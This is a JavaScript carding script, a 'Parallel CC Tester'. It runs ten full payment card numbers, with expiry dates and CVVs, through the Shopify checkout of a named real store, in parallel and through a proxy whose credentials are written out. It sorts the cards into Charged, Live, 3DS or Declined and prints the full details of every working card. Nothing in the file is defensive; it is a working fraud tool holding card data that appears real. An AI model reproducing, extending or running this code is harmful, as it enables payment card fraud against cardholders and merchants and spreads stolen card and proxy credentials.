/**
 * Parallel CC Tester - Tests multiple cards simultaneously
 * Usage: node test_parallel.js
 */

import ShopifyCheckout from './site.js';

// Configuration
const CONFIG = {
    site: 'saratogateaandhoney.com',
    proxy: 'pl-tor.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
    maxConcurrent: 10  // Max parallel tests
};

// Credit cards to test (format: number|month|year|cvv)
const CARDS = [
    '5356666822463532|01|26|163',
    '5333499430407438|08|29|738',
    '5323656191984291|03|27|040',
    '5287498033548701|08|26|768',
    '4400660524407706|09|28|316',
    '5115169962035733|01|27|629',
    '4400667496825690|08|26|335',
    '5160750001577803|08|26|557',
    '5262271053327622|02|29|334',
    '5262183739513634|10|29|056',
];

// Parse a CC string into components
function parseCard(ccString) {
    const parts = ccString.split('|');
    if (parts.length < 4) return null;
    
    return {
        number: parts[0].replace(/\s/g, ''),
        month: parts[1].padStart(2, '0'),
        year: parts[2].length === 2 ? `20${parts[2]}` : parts[2],
        cvv: parts[3],
        name: 'John Smith'
    };
}

// Test a single card
async function testCard(ccString, index) {
    const card = parseCard(ccString);
    if (!card) {
        return { 
            card: ccString, 
            status: 'Error', 
            message: 'Invalid card format',
            index 
        };
    }
    
    const maskedCard = `${card.number.slice(0,6)}****${card.number.slice(-4)}`;
    console.log(`[${index + 1}] Testing: ${maskedCard}`);
    
    const checkout = new ShopifyCheckout({
        domain: CONFIG.site,
        card: card,
        profile: {
            firstName: 'John',
            lastName: 'Smith',
            email: `test${Date.now()}${index}@gmail.com`
        },
        proxy: CONFIG.proxy,
        debug: false
    });
    
    try {
        const result = await checkout.run();
        return {
            index: index + 1,
            card: maskedCard,
            fullCard: ccString,
            status: result.status,
            message: result.message,
            gateway: result.gateway,
            total: result.total,
            time: result.time
        };
    } catch (error) {
        return {
            index: index + 1,
            card: maskedCard,
            fullCard: ccString,
            status: 'Error',
            message: error.message,
            time: '0s'
        };
    }
}

// Run all tests in parallel
async function runParallelTests() {
    console.log('═'.repeat(70));
    console.log('  PARALLEL CC TESTER - Testing ' + CARDS.length + ' cards');
    console.log('═'.repeat(70));
    console.log(`Site:  ${CONFIG.site}`);
    console.log(`Proxy: ${CONFIG.proxy.split(':')[0]}:${CONFIG.proxy.split(':')[1]}`);
    console.log(`Cards: ${CARDS.length}`);
    console.log('═'.repeat(70));
    console.log();
    
    const startTime = Date.now();
    
    // Run all tests in parallel
    const promises = CARDS.map((cc, index) => testCard(cc, index));
    const results = await Promise.all(promises);
    
    const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
    
    // Print results
    console.log('\n' + '═'.repeat(70));
    console.log('  RESULTS SUMMARY');
    console.log('═'.repeat(70));
    console.log();
    
    // Group by status
    const grouped = {
        'Charged': [],
        'Live': [],
        '3DS': [],
        'Declined': [],
        'Error': [],
        'Unknown': []
    };
    
    for (const result of results) {
        const status = result.status || 'Unknown';
        if (grouped[status]) {
            grouped[status].push(result);
        } else {
            grouped['Unknown'].push(result);
        }
    }
    
    // Print table header
    console.log('┌─────┬────────────────────┬───────────┬────────────────────────────────┬─────────┐');
    console.log('│  #  │ Card               │ Status    │ Message                        │ Time    │');
    console.log('├─────┼────────────────────┼───────────┼────────────────────────────────┼─────────┤');
    
    for (const result of results) {
        const idx = String(result.index).padStart(3);
        const card = result.card.padEnd(18);
        const status = (result.status || 'Unknown').padEnd(9);
        const message = (result.message || '').substring(0, 30).padEnd(30);
        const time = (result.time || '0s').padStart(7);
        
        // Color coding based on status
        let statusIcon = '❓';
        if (result.status === 'Charged') statusIcon = '✅';
        else if (result.status === 'Live') statusIcon = '🟢';
        else if (result.status === '3DS') statusIcon = '🔐';
        else if (result.status === 'Declined') statusIcon = '❌';
        else if (result.status === 'Error') statusIcon = '⚠️';
        
        console.log(`│ ${idx} │ ${card} │ ${statusIcon}${status}│ ${message} │ ${time} │`);
    }
    
    console.log('└─────┴────────────────────┴───────────┴────────────────────────────────┴─────────┘');
    
    // Print summary
    console.log('\n' + '─'.repeat(70));
    console.log('  SUMMARY');
    console.log('─'.repeat(70));
    console.log(`✅ Charged:  ${grouped['Charged'].length}`);
    console.log(`🟢 Live:     ${grouped['Live'].length}`);
    console.log(`🔐 3DS:      ${grouped['3DS'].length}`);
    console.log(`❌ Declined: ${grouped['Declined'].length}`);
    console.log(`⚠️  Error:    ${grouped['Error'].length}`);
    console.log(`❓ Unknown:  ${grouped['Unknown'].length}`);
    console.log('─'.repeat(70));
    console.log(`Total Time: ${totalTime}s for ${CARDS.length} cards`);
    console.log(`Avg Time:   ${(totalTime / CARDS.length).toFixed(2)}s per card`);
    console.log('═'.repeat(70));
    
    // Print live cards
    if (grouped['Charged'].length > 0 || grouped['Live'].length > 0 || grouped['3DS'].length > 0) {
        console.log('\n✅ LIVE/WORKING CARDS:');
        console.log('─'.repeat(70));
        [...grouped['Charged'], ...grouped['Live'], ...grouped['3DS']].forEach(r => {
            console.log(`${r.fullCard} | ${r.status} | ${r.message}`);
        });
    }
    
    // Print declined cards
    if (grouped['Declined'].length > 0) {
        console.log('\n❌ DECLINED CARDS:');
        console.log('─'.repeat(70));
        grouped['Declined'].forEach(r => {
            console.log(`${r.fullCard} | ${r.message}`);
        });
    }
    
    return results;
}

// Main
runParallelTests().catch(console.error);
